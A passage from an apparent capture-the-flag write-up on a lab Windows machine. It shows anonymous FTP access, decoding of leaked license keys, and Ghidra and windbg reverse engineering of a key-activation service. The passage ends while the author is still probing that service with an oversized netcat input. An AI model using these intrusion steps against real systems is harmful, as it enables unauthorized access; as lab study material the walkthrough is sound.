Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">57</span>.58<span class="w"> </span>seconds
</code></pre></div>
<p>Nmap discovered an FTP service, and that service allows <code>Anonymous</code> authentication.   So I connect to it, authenticating with <code>Anonymous:&lt;no password&gt;</code>, switch to <code>binary</code> mode, and use <code>mget *</code> to download the files.</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>ftp<span class="w"> </span>reaper.vl<span class="w"> </span><span class="m">21</span>
Connected<span class="w"> </span>to<span class="w"> </span>reaper.vl.
<span class="m">220</span><span class="w"> </span>Microsoft<span class="w"> </span>FTP<span class="w"> </span>Service
Name<span class="w"> </span><span class="o">(</span>reaper.vl:notroot<span class="o">)</span>:<span class="w"> </span>Anonymous
<span class="m">331</span><span class="w"> </span>Anonymous<span class="w"> </span>access<span class="w"> </span>allowed,<span class="w"> </span>send<span class="w"> </span>identity<span class="w"> </span><span class="o">(</span>e-mail<span class="w"> </span>name<span class="o">)</span><span class="w"> </span>as<span class="w"> </span>password.
Password:<span class="w"> </span>
<span class="m">230</span><span class="w"> </span>User<span class="w"> </span>logged<span class="w"> </span><span class="k">in</span>.
Remote<span class="w"> </span>system<span class="w"> </span><span class="nb">type</span><span class="w"> </span>is<span class="w"> </span>Windows_NT.
ftp&gt;<span class="w"> </span>ls
<span class="m">229</span><span class="w"> </span>Entering<span class="w"> </span>Extended<span class="w"> </span>Passive<span class="w"> </span>Mode<span class="w"> </span><span class="o">(||</span><span class="p">|</span><span class="m">5001</span><span class="p">|</span><span class="o">)</span>
<span class="m">125</span><span class="w"> </span>Data<span class="w"> </span>connection<span class="w"> </span>already<span class="w"> </span>open<span class="p">;</span><span class="w"> </span>Transfer<span class="w"> </span>starting.
<span class="m">08</span>-15-23<span class="w">  </span><span class="m">12</span>:12AM<span class="w">                  </span><span class="m">262</span><span class="w"> </span>dev_keys.txt
<span class="m">08</span>-14-23<span class="w">  </span><span class="m">02</span>:53PM<span class="w">               </span><span class="m">187392</span><span class="w"> </span>dev_keysvc.exe
<span class="m">226</span><span class="w"> </span>Transfer<span class="w"> </span>complete.
ftp&gt;<span class="w"> </span>binary
<span class="m">200</span><span class="w"> </span>Type<span class="w"> </span><span class="nb">set</span><span class="w"> </span>to<span class="w"> </span>I.
ftp&gt;<span class="w"> </span>mget<span class="w"> </span>*
mget<span class="w"> </span>dev_keys.txt<span class="w"> </span><span class="o">[</span>anpqy?<span class="o">]</span>?<span class="w"> </span>a
Prompting<span class="w"> </span>off<span class="w"> </span><span class="k">for</span><span class="w"> </span>duration<span class="w"> </span>of<span class="w"> </span>mget.
<span class="m">229</span><span class="w"> </span>Entering<span class="w"> </span>Extended<span class="w"> </span>Passive<span class="w"> </span>Mode<span class="w"> </span><span class="o">(||</span><span class="p">|</span><span class="m">5003</span><span class="p">|</span><span class="o">)</span>
<span class="m">125</span><span class="w"> </span>Data<span class="w"> </span>connection<span class="w"> </span>already<span class="w"> </span>open<span class="p">;</span><span class="w"> </span>Transfer<span class="w"> </span>starting.
<span class="m">100</span>%<span class="w"> </span><span class="p">|</span>***************************************************************<span class="p">|</span><span class="w">   </span><span class="m">262</span><span class="w">        </span><span class="m">1</span>.45<span class="w"> </span>KiB/s<span class="w">    </span><span class="m">00</span>:00<span class="w"> </span>ETA
<span class="m">226</span><span class="w"> </span>Transfer<span class="w"> </span>complete.
<span class="m">262</span><span class="w"> </span>bytes<span class="w"> </span>received<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="o">(</span><span class="m">0</span>.92<span class="w"> </span>KiB/s<span class="o">)</span>
<span class="m">229</span><span class="w"> </span>Entering<span class="w"> </span>Extended<span class="w"> </span>Passive<span class="w"> </span>Mode<span class="w"> </span><span class="o">(||</span><span class="p">|</span><span class="m">5004</span><span class="p">|</span><span class="o">)</span>
<span class="m">125</span><span class="w"> </span>Data<span class="w"> </span>connection<span class="w"> </span>already<span class="w"> </span>open<span class="p">;</span><span class="w"> </span>Transfer<span class="w"> </span>starting.
<span class="m">100</span>%<span class="w"> </span><span class="p">|</span>***************************************************************<span class="p">|</span><span class="w">   </span><span class="m">183</span><span class="w"> </span>KiB<span class="w">  </span><span class="m">128</span>.52<span class="w"> </span>KiB/s<span class="w">    </span><span class="m">00</span>:00<span class="w"> </span>ETA
<span class="m">226</span><span class="w"> </span>Transfer<span class="w"> </span>complete.
<span class="m">187392</span><span class="w"> </span>bytes<span class="w"> </span>received<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">00</span>:01<span class="w"> </span><span class="o">(</span><span class="m">120</span>.19<span class="w"> </span>KiB/s<span class="o">)</span>
ftp&gt;<span class="w"> </span><span class="nb">exit</span>
<span class="m">221</span><span class="w"> </span>Goodbye.
</code></pre></div>
<p>Inside the <code>dev_keys.txt</code>:</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>cat<span class="w"> </span>dev_keys.txt<span class="w"> </span>
Development<span class="w"> </span>Keys:

<span class="m">100</span>-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ<span class="o">==</span>
<span class="m">101</span>-FE9A1-550-A271-0109-UHJlbWl1bSBMaWNlbnNl
<span class="m">102</span>-FE9A1-500-A272-0106-UHJlbWl1bSBMaWNlbnNl

The<span class="w"> </span>dev<span class="w"> </span>keys<span class="w"> </span>can<span class="w"> </span>not<span class="w"> </span>be<span class="w"> </span>activated<span class="w"> </span>yet,<span class="w"> </span>we<span class="w"> </span>are<span class="w"> </span>working<span class="w"> </span>on<span class="w"> </span>fixing<span class="w"> </span>a<span class="w"> </span>bug<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>activation<span class="w"> </span><span class="k">function</span>.
</code></pre></div>
<p>It contains three UUID-like strings, each ending in what appears to be <code>base64</code>.   They translate to <code>Standard License</code> and <code>Premium License</code> respectively</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>file<span class="w"> </span>dev_keys.txt<span class="w"> </span>
dev_keys.txt:<span class="w"> </span>ASCII<span class="w"> </span>text,<span class="w"> </span>with<span class="w"> </span>CRLF<span class="w"> </span>line<span class="w"> </span>terminators

┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>dos2unix<span class="w"> </span>dev_keys.txt<span class="w"> </span>
dos2unix:<span class="w"> </span>converting<span class="w"> </span>file<span class="w"> </span>dev_keys.txt<span class="w"> </span>to<span class="w"> </span>Unix<span class="w"> </span>format...

┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>cat<span class="w"> </span>dev_keys.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>--<span class="w"> </span>-<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="w"> </span><span class="s1">'-'</span><span class="w"> </span>-f<span class="w"> </span><span class="m">6</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>b64<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>cat<span class="w"> </span>-<span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="nv">$b64</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">""</span><span class="p">;</span><span class="w"> </span><span class="k">done</span>
Standard<span class="w"> </span>License
Premium<span class="w"> </span>License
Premium<span class="w"> </span>License
</code></pre></div>
<p>Running the application in my sandbox Windows VM, I found the application listens on port <code>4141</code></p>
<div class="highlight"><pre><span></span><code><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">reaper</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">dev_keysvc</span><span class="p">.</span><span class="n">exe</span>
<span class="n">Server</span> <span class="n">listening</span> <span class="n">on</span> <span class="n">port</span> <span class="n">4141</span>
</code></pre></div>
<p>Confirmed by <code>nmap</code> on the <code>REAPER</code> host</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>nmap<span class="w"> </span>-sT<span class="w"> </span>-Pn<span class="w"> </span>reaper.vl<span class="w"> </span>-p<span class="w"> </span><span class="m">4141</span>
Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.95<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-10-31<span class="w"> </span><span class="m">21</span>:53<span class="w"> </span>PDT
Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>reaper.vl<span class="w"> </span><span class="o">(</span><span class="m">10</span>.129.234.200<span class="o">)</span>
Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.10s<span class="w"> </span>latency<span class="o">)</span>.

PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE
<span class="m">4141</span>/tcp<span class="w"> </span>open<span class="w">  </span>oirtgsvc

Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">0</span>.12<span class="w"> </span>seconds
</code></pre></div>
<p><code>Ghidra</code> shows that the binary is a 64bit executable.  This is made obvious by the fact that the address size is 64, and the min/max address is in a range that is also only possible in a 64bit context.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251031220323.png" data-desc-position="bottom"><img alt="Pasted_image_20251031220323.png" src="../../../../Pasted_image_20251031220323.png"></a></p>
<h2 id="ghidra-analysis">Ghidra analysis<a class="headerlink" href="#ghidra-analysis" title="Permanent link">¶</a></h2>
<p>The entrypoint starts out by creating a stack cookie.  The only other function call is to <code>__scrt_common_main_seh()</code></p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251031223630.png" data-desc-position="bottom"><img alt="Pasted_image_20251031223630.png" src="../../../../Pasted_image_20251031223630.png"></a></p>
<h3 id="common_main_seh">common_main_seh()<a class="headerlink" href="#common_main_seh" title="Permanent link">¶</a></h3>
<p>Once within this function, the function of interest is <code>FUN_140001bd0()</code>, which I have renamed to <code>bind_server</code> due to functions with ordinal numbers, which align to <code>ws2_32.dll</code>, and calls consistent with standing up a bind server.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251031225644.png" data-desc-position="bottom"><img alt="Pasted_image_20251031225644.png" src="../../../../Pasted_image_20251031225644.png"></a></p>
<h3 id="bind_server">bind_server()<a class="headerlink" href="#bind_server" title="Permanent link">¶</a></h3>
<p>A list of <code>ws2_32</code> ordinals: <a href="https://strontic.github.io/xcyclopedia/library/ws2_32.dll-9AB0235EC0B3AAC2A9E82C18B4677F89.html">https://strontic.github.io/xcyclopedia/library/ws2_32.dll-9AB0235EC0B3AAC2A9E82C18B4677F89.html</a></p>
<p>The list is hard to digest due to sorting by function name.  It's easier to fix this by just copying them to a file, transforming it a bit, and sorting it by ordinal numerically, out to a csv format.</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>cat<span class="w"> </span>ws2_32.ordinals.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-re<span class="w"> </span><span class="s1">'s/\t/,/g'</span><span class="w"> </span>-e<span class="w"> </span><span class="s1">'s/[ ]+/ /g'</span><span class="w"> </span>-e<span class="w"> </span><span class="s1">'s/ ,/,/g'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="w"> </span><span class="s1">','</span><span class="w"> </span>-f<span class="w"> </span><span class="m">1</span>,2<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span>-F<span class="w"> </span><span class="s1">','</span><span class="w"> </span><span class="s1">'{print $2","$1}'</span><span class="w"> </span><span class="p">|</span>sort<span class="w"> </span>-n<span class="w"> </span>&gt;<span class="w"> </span>ordinals_ws2_32.csv
</code></pre></div>
<p>Then, I can just create an <code>sqlite</code> database, create a table for the data, and import it.</p>
<div class="highlight"><pre><span></span><code>sqlite3<span class="w"> </span>ws2_32.db
create<span class="w"> </span>table<span class="w"> </span>ws2_32<span class="w"> </span><span class="o">(</span><span class="w"> </span>ordinal<span class="w"> </span>int32,<span class="w"> </span>name<span class="w"> </span>varchar<span class="o">[</span><span class="m">32</span><span class="o">]</span><span class="w"> </span><span class="o">)</span><span class="p">;</span>
.mode<span class="w"> </span>csv
.import<span class="w"> </span>ordinals_ws2_32.csv<span class="w"> </span>ws2_32
</code></pre></div>
<p>Now in <code>bind_server()</code>:</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251031230337.png" data-desc-position="bottom"><img alt="Pasted_image_20251031230337.png" src="../../../../Pasted_image_20251031230337.png"></a></p>
<p>I am seeing calls to ordinals in the following order:
</p><div class="highlight"><pre><span></span><code>115
23
9
2
13
1
</code></pre></div><p></p>
<p>These translate to the following <code>ws2_32</code> function calls:</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span><span class="k">for</span><span class="w"> </span>ordinal<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">115</span><span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">9</span><span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="m">13</span><span class="w"> </span><span class="m">1</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>sqlite3<span class="w"> </span>ws2_32.db<span class="w"> </span><span class="s2">"select * from ws2_32 where ordinal == </span><span class="nv">$ordinal</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span><span class="k">done</span>
<span class="m">115</span><span class="p">|</span>WSAStartup
<span class="m">23</span><span class="p">|</span>socket
<span class="m">9</span><span class="p">|</span>htons
<span class="m">2</span><span class="p">|</span><span class="nb">bind</span>
<span class="m">13</span><span class="p">|</span>listen
<span class="m">1</span><span class="p">|</span>accept
</code></pre></div>
<p>Making it easier to visually follow once the references are renamed (a manual process but well worth it, wherever possible)</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251031231057.png" data-desc-position="bottom"><img alt="Pasted_image_20251031231057.png" src="../../../../Pasted_image_20251031231057.png"></a></p>
<p>But, it's really here within line 49 where we are interested.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251031231809.png" data-desc-position="bottom"><img alt="Pasted_image_20251031231809.png" src="../../../../Pasted_image_20251031231809.png"></a></p>
<ol>
<li><code>FUN_14000ee50</code>: This function calls functions like <code>CreateThread</code>, <code>CloseHandle</code>, and <code>FreeLibrary</code> </li>
<li><code>FUN_140001000</code>:  This function calls <code>VirtualAlloc</code> twice, followed by <code>ws2_32</code> ordinals 19, 16, and 3</li>
</ol>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span><span class="k">for</span><span class="w"> </span>ordinal<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">19</span><span class="w"> </span><span class="m">16</span><span class="w"> </span><span class="m">3</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>sqlite3<span class="w"> </span>ws2_32.db<span class="w"> </span><span class="s2">"select * from ws2_32 where ordinal == </span><span class="nv">$ordinal</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span><span class="k">done</span>
<span class="m">19</span><span class="p">|</span>send
<span class="m">16</span><span class="p">|</span>recv
<span class="m">3</span><span class="p">|</span>closesocket
</code></pre></div>
<p>It is for that reason I have named the function <code>bind_client</code>.  This is a function well worth examining closely, as this is a function that handles user input.</p>
<h3 id="bind_client">bind_client()<a class="headerlink" href="#bind_client" title="Permanent link">¶</a></h3>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251109102039.png" data-desc-position="bottom"><img alt="Pasted_image_20251109102039.png" src="../../../../Pasted_image_20251109102039.png"></a></p>
<p>We can see on line 24 and 25 above that there are two <code>VirtualAlloc</code>s that occur into local variables <code>local_48</code> and <code>local_40</code>.  Probably <code>recv</code> and <code>working_set</code> type buffers.  On line 27 it is shown a string, likely one that will be used in a prompt to select an option, either (1) <code>Set key</code> or (2) <code>Activate key</code>.  We enter into a <code>while</code> loop that is greater than what is displayed, and immediately enter into two more nested <code>while</code> loops.  This is where the string is sent to the user, and input is received by the user.  If the user input isn't "1", we break out of the third <code>while</code> loop, and nothing follows that <code>while</code> loop so we effectively break out of the second <code>while</code> loop as well.  </p>
<p>We can see that on line 35, the server <code>send</code>s "Enter a key: ",  then on line 38 we see a <code>recv</code> into <code>local_40</code> (that is the second <code>VirtualAlloc</code>), without a size.  Of note, the first argument is <code>local_50</code> (actually to all the <code>send</code> and <code>recv</code> calls, which means that is the client <code>sockfd</code>.  So lines 35 and 38 prompt the user for a key input.  Line 40 is a do-nothing.  </p>
<p>The function call on line 41 to <code>validate_key_format</code> is particularly interesting, it seems to process the supplied key by checking the key prefix and deeply nested function call to:</p>
<div class="highlight"><pre><span></span><code><span class="w">        </span><span class="n">bVar2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__crt_stdio_input</span><span class="o">::</span><span class="n">format_string_parser</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;::</span><span class="n">advance</span>
<span class="w">                          </span><span class="p">((</span><span class="n">format_string_parser</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">param_1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x20</span><span class="p">));</span>
</code></pre></div>
<p>But it is what occurs after the first <code>while</code> loop that is most interesting.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251109103106.png" data-desc-position="bottom"><img alt="Pasted_image_20251109103106.png" src="../../../../Pasted_image_20251109103106.png"></a></p>
<p>The function call to <code>find_key</code> does things like open a file <code>keys.txt</code> for reading, and nested function call within it seems to do what appears to be base64 decoding (could be wrong), and some string comparison.</p>
<p>But it is the call to <code>case_exec</code> where the magic is at.  It is called with a pointer to the user-supplied buffer, null, and 0x1000 which I assume is a <code>maxlength</code>.</p>
<h3 id="case_exec">case_exec<a class="headerlink" href="#case_exec" title="Permanent link">¶</a></h3>
<p>The <code>case_exec</code> function starts off with a rather long <code>switch</code>/<code>case</code> statement, longer than I could fit in a screenshot so I include the first part of it</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251109103837.png" data-desc-position="bottom"><img alt="Pasted_image_20251109103837.png" src="../../../../Pasted_image_20251109103837.png"></a></p>
<p>In order to trace with some dynamic analysis I rebase the application to 0x0, so I can use relative offsets in <code>windbg</code>.   For that, I open memory map in Ghidra, click the house icon, and rebase to 0x0.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251109104546.png" data-desc-position="bottom"><img alt="Pasted_image_20251109104546.png" src="../../../../Pasted_image_20251109104546.png"></a></p>
<p>I use <code>windbg</code> to place a breakpoint at the call and step into it once the breakpoint is hit.  Here is what I use to handle lifecycle and breakpoint.</p>
<div class="highlight"><pre><span></span><code><span class="o">((</span>cmd.exe<span class="w"> </span>/c<span class="w"> </span><span class="s2">"taskkill /F /IM dev_keysvc.exe"</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>START<span class="w"> </span>/B<span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="s2">"C:\reaper\dev_keysvc.exe"</span><span class="w"> </span>&gt;<span class="w"> </span>c:<span class="se">\r</span>eaper<span class="se">\o</span>utput.txt<span class="o">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>START<span class="w"> </span>/B<span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="s2">"C:\reaper\dev_keysvc.exe"</span><span class="w"> </span>&gt;<span class="w"> </span>c:<span class="se">\r</span>eaper<span class="se">\o</span>utput.txt<span class="o">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>timeout<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg.exe"</span><span class="w"> </span>-WF<span class="w"> </span>C:<span class="se">\w</span>indbg_custom.WEW<span class="w"> </span>-pn<span class="w"> </span>dev_keysvc.exe<span class="w"> </span>-c<span class="w"> </span><span class="s1">'bp dev_keysvc+0x1116; g'</span>
</code></pre></div>
<p>And I start with an initial buffer to try to reach the function.  Because the base64 will be longer than the input to it, and because upper bound is 0x1000, I use something a little smaller, like, 3000 bytes (<code>0xbb8</code>) instead of the full 4096.</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>nc<span class="w"> </span><span class="m">192</span>.168.56.100<span class="w"> </span><span class="m">4141</span><span class="w"> </span>&lt;<span class="w"> </span>&lt;<span class="o">(</span><span class="nb">echo</span><span class="w"> </span>-ne<span class="w"> </span><span class="s2">"1\n101-FE9A1-550-A271-0109-"</span><span class="k">$(</span>perl<span class="w"> </span>-e<span class="w"> </span><span class="s1">'printf "A"x0xbb8'</span><span class="p">|</span>base64<span class="w"> </span>-w0<span class="k">)</span><span class="s2">"\n"</span><span class="p">;</span><span class="w"> </span>sleep<span class="w"> </span><span class="m">2</span><span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span>-ne<span class="w"> </span><span class="s2">"2\n"</span><span class="p">;</span><span class="w"> </span>sleep<span class="w"> </span><span class="m">2</span><span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span>-ne<span class="w"> </span><span class="s2">"3\n"</span><span class="o">)</span>
</code></pre></div>
<p>The function starts off with some function prologue followed by moving the base address into <code>r10</code>.</p>
<p>Shortly after, there is a comparison of <code>maxlen</code> (arg3) to <code>0xf</code>.  <code>0x1000</code> is obviously greater than this, so we would take this jump, which basically we skip the <code>switch</code>/<code>case</code> statement.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251109104931.png" data-desc-position="bottom"><img alt="Pasted_image_20251109104931.png" src="../../../../Pasted_image_20251109104931.png"></a></p>
<p>Stepping through execution to the jump above instruction, that is exactly what happens.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251109105050.png" data-desc-position="bottom"><img alt="Pasted_image_20251109105050.png" src="../../../../Pasted_image_20251109105050.png"></a></p>
<p>That brings us here:</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251109105334.png" data-desc-position="bottom"><img alt="Pasted_image_20251109105334.png" src="../../../../Pasted_image_20251109105334.png"></a></p>
<p>We can skip over the IF statement on line 73 because <code>maxlen</code> is <code>0x1000</code>, so we know <code>maxlen</code> can't be less than <code>0x21</code>.</p>
<p>We can also skip over the IF statement on line 79 because at the time we reach that comparison, the data region evaluates to 5.  Of interesting note is that there appears to be a function pointer exec on line 100, and things like this start to look relevant, interesting, and maybe even exciting.</p>
<p>A comparison statement on line 106 is what follows.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251109110513.png" data-desc-position="bottom"><img alt="Pasted_image_20251109110513.png" src="../../../../Pasted_image_20251109110513.png"></a></p>
<p>If execution can enter the innermost IF statement visible in the screenshot above, <code>maxlen</code> is tested against <code>0x120</code> through <code>0x1ff</code> through a series of <code>case</code> statements.  There are other cases too like <code>0x100</code> and a <code>default</code> case, only the latter of which doesn't result in a <code>vmovntdq_avx</code>.  That instruction moves memory around in chunks of 256 bytes based on analysis.</p>
<p>But at the end of this operation there is another function pointer exec.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251109111014.png" data-desc-position="bottom"><img alt="Pasted_image_20251109111014.png" src="../../../../Pasted_image_20251109111014.png"></a></p>
<p>Examining the code that is in fact exactly what happens</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251109111336.png" data-desc-position="bottom"><img alt="Pasted_image_20251109111336.png" src="../../../../Pasted_image_20251109111336.png"></a></p>
<p>If I set a breakpoint on this <code>jmp r11</code> instruction and continue (g), sure enough, that is where execution lands.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251109111639.png" data-desc-position="bottom"><img alt="Pasted_image_20251109111639.png" src="../../../../Pasted_image_20251109111639.png"></a></p>
<p>But unfortunately, it appears we actually just jump to code that zeroes out the memory</p>
<div class="highlight"><pre><span></span><code><span class="m">0</span>:003&gt;<span class="w"> </span>u<span class="w"> </span>r11
dev_keysvc+0x32d1:
00007ff6<span class="sb">`</span>2c4232d1<span class="w"> </span>c4a17e7f840920ffffff<span class="w"> </span>vmovdqu<span class="w"> </span>ymmword<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rcx+r9-0E0h<span class="o">]</span>,ymm0
00007ff6<span class="sb">`</span>2c4232db<span class="w"> </span>c4a17e7f840940ffffff<span class="w"> </span>vmovdqu<span class="w"> </span>ymmword<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rcx+r9-0C0h<span class="o">]</span>,ymm0
00007ff6<span class="sb">`</span>2c4232e5<span class="w"> </span>c4a17e7f840960ffffff<span class="w"> </span>vmovdqu<span class="w"> </span>ymmword<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rcx+r9-0A0h<span class="o">]</span>,ymm0
00007ff6<span class="sb">`</span>2c4232ef<span class="w"> </span>c4a17e7f440980<span class="w">  </span>vmovdqu<span class="w"> </span>ymmword<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rcx+r9-80h<span class="o">]</span>,ymm0
00007ff6<span class="sb">`</span>2c4232f6<span class="w"> </span>c4a17e7f4409a0<span class="w">  </span>vmovdqu<span class="w"> </span>ymmword<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rcx+r9-60h<span class="o">]</span>,ymm0
00007ff6<span class="sb">`</span>2c4232fd<span class="w"> </span>c4a17e7f4409c0<span class="w">  </span>vmovdqu<span class="w"> </span>ymmword<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rcx+r9-40h<span class="o">]</span>,ymm0
00007ff6<span class="sb">`</span>2c423304<span class="w"> </span>c4a17e7f4401e0<span class="w">  </span>vmovdqu<span class="w"> </span>ymmword<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rcx+r8-20h<span class="o">]</span>,ymm0
00007ff6<span class="sb">`</span>2c42330b<span class="w"> </span>c5fe7f00<span class="w">        </span>vmovdqu<span class="w"> </span>ymmword<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rax<span class="o">]</span>,ymm0
<span class="m">0</span>:003&gt;<span class="w"> </span>r<span class="w"> </span>ymm0
